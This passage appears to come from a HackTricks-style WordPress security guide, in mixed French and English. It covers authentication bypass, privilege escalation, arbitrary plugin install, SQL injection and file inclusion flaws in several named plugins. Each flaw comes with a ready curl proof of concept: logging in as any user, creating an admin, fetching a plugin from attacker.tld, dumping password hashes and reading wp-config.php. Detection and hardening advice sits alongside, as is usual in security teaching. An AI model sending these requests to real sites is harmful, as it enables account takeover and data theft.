De nombreux themes/plugins intègrent des helpers de "social login" exposés via admin-ajax.php. Si une action AJAX non authentifiée (wp_ajax_nopriv_...) accorde sa confiance à des identifiants fournis par le client lorsque les données du provider sont absentes, puis appelle wp_set_auth_cookie(), cela devient un contournement total de l'authentification.

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Pourquoi c'est exploitable

- Accès non authentifié via admin-ajax.php (wp_ajax_nopriv_… action).
- Absence de vérifications nonce/capability avant un changement d'état.
- Absence de vérification du provider OAuth/OpenID ; la branche par défaut accepte l'entrée de l'attaquant.
- get_user_by('email', $_POST['id']) suivi de wp_set_auth_cookie($uid) authentifie le requérant comme n'importe quelle adresse email existante.

Exploitation (unauthenticated)

- Prérequis : attacker peut atteindre /wp-admin/admin-ajax.php et connaît/devine un email d'utilisateur valide.
- Set provider to an unsupported value (or omit it) to hit the default branch and pass id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspecter le thème/plugin pour les enregistrements add_action('wp_ajax_nopriv_...', '...') dans le code de social login (par ex. framework/add-ons/social-login/class-social-login.php).
- Grep pour wp_set_auth_cookie(), get_user_by('email', ...) dans les gestionnaires AJAX.

Detection checklist

- Web logs montrant des POST non authentifiés vers /wp-admin/admin-ajax.php avec l'action social-login et id=<email>.
- Réponses 200 contenant le JSON de succès immédiatement avant du trafic authentifié depuis la même IP/User-Agent.

Hardening

- Ne pas dériver l'identité à partir d'entrées client. N'accepter que les emails/IDs provenant d'un token/ID fournisseur validé.
- Exiger des nonces CSRF et des vérifications de capability même pour les helpers de login ; éviter d'enregistrer wp_ajax_nopriv_ sauf si strictement nécessaire.
- Valider et vérifier côté serveur les réponses OAuth/OIDC ; rejeter les providers manquants/invalides (pas de fallback sur POST id).
- Envisager de désactiver temporairement la connexion sociale ou de patcher virtuellement en périphérie (bloquer l'action vulnérable) jusqu'à correction.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ≤ 1.0.82)

Some plugins expose REST endpoints that mint reusable “connection keys” or tokens without verifying the caller’s capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions → RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC – mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Pourquoi c'est exploitable
- Route REST sensible protégée uniquement par une preuve d'identité à faible entropie (username) ou permission_callback manquant
- Pas d'application des capabilities ; la clé mintée est acceptée comme un contournement universel

Detection checklist
- Grep dans le code du plugin pour register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Toute route qui émet des tokens/keys basés sur une identité fournie par la requête (username/email) sans la lier à un utilisateur authentifié ou à une capability
- Chercher des routes ultérieures qui acceptent le token/la key générée sans vérifications de capability côté serveur

Hardening
- Pour toute route REST privilégiée : exiger un permission_callback qui applique current_user_can() pour la capability requise
- Ne pas générer de clés à longue durée de vie à partir d'une identité fournie par le client ; si nécessaire, émettre des tokens à courte durée de vie liés à l'utilisateur après authentification et re-vérifier les capabilities à l'utilisation
- Valider le contexte utilisateur de l'appelant (wp_set_current_user ne suffit pas seul) et rejeter les requêtes où !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse → unauthenticated arbitrary plugin installation (FunnelKit Automations ≤ 3.5.3)

Nonces prevent CSRF, not authorization. Si le code considère qu'un Nonce valide suffit et saute ensuite les vérifications de capability pour des opérations privilégiées (par ex., install/activate plugins), des attaquants non authentifiés peuvent satisfaire une exigence de Nonce faible et atteindre RCE en installant un plugin backdooré ou vulnérable.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce “passes”
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers qui modifient des plugins/themes en se basant uniquement sur wp_verify_nonce()/check_admin_referer() et sans capability check
- Tout chemin de code qui définit $skip_caps = true après la validation du nonce

Hardening
- Traitez toujours les nonces uniquement comme des tokens CSRF ; appliquez des vérifications de capability indépendamment de l'état du nonce
- Exiger current_user_can('install_plugins') et current_user_can('activate_plugins') avant d'atteindre le code d'installer
- Refuser l'accès non authentifié ; éviter d'exposer des actions AJAX nopriv pour des flux privilégiés

---

## Unauthenticated SQLi via s search parameter in depicter-* actions (Depicter Slider ≤ 3.6.1)

Plusieurs actions depicter-* consommaient le paramètre s (search) et le concatenaient dans des requêtes SQL sans utiliser de requêtes préparées.

- Parameter: s (search)
- Flaw: concaténation directe de chaînes dans les clauses WHERE/LIKE ; pas de requêtes préparées ni de nettoyage/validation des entrées
- Impact: exfiltration de la base de données (utilisateurs, hashs), mouvement latéral

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Checklist de détection
- Grep for depicter-* action handlers and direct use of $_GET['s'] or $_POST['s'] in SQL
- Vérifier les requêtes personnalisées passées à $wpdb->get_results()/query() concaténant s

Durcissement
- Utiliser toujours $wpdb->prepare() or wpdb placeholders ; rejeter les métacaractères inattendus côté serveur
- Ajouter une allowlist stricte pour s et normaliser vers le charset/longueur attendus

---

## Local File Inclusion non authentifiée via unvalidated template/file path (Kubio AI Page Builder ≤ 2.5.1)

Accepter des chemins contrôlés par un attaquant dans un paramètre de template sans normalisation/confinement permet de lire des fichiers locaux arbitraires, et parfois l'exécution de code si des fichiers PHP/log incluables sont chargés à l'exécution.

- Paramètre : __kubio-site-edit-iframe-classic-template
- Faiblesse : pas de normalisation/allowlist ; traversal autorisé
- Impact : divulgation de secrets (wp-config.php), RCE potentiel dans certains environnements (log poisoning, PHP incluable)

PoC – lire wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Detection checklist
- Tout handler concaténant des chemins de requête dans des sinks include()/require()/read sans contrôle via realpath()
- Rechercher des traversal patterns (../) s'étendant en dehors du répertoire templates prévu

Hardening
- Imposer des templates allowlisted ; résoudre avec realpath() et exiger str_starts_with(realpath(file), realpath(allowed_base))
- Normaliser les entrées ; rejeter les traversal sequences et les chemins absolus ; utiliser sanitize_file_name() uniquement pour les noms de fichier (pas pour les chemins complets)


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
